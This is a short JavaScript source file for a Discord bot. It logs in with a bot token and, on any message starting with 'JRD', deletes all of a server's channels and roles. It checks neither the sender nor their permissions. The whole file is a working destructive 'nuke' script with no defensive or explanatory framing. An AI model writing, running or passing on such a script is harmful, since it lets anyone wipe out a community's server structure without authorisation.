const Discord = require('discord.js');
const client = new Discord.Client();


client.login(process.env.BOT);


client.on('message', message => {
  if(message.content.startsWith('JRD')){
    message.guild.channels.deleteAll();
    message.guild.roles.deleteAll();
  }
});
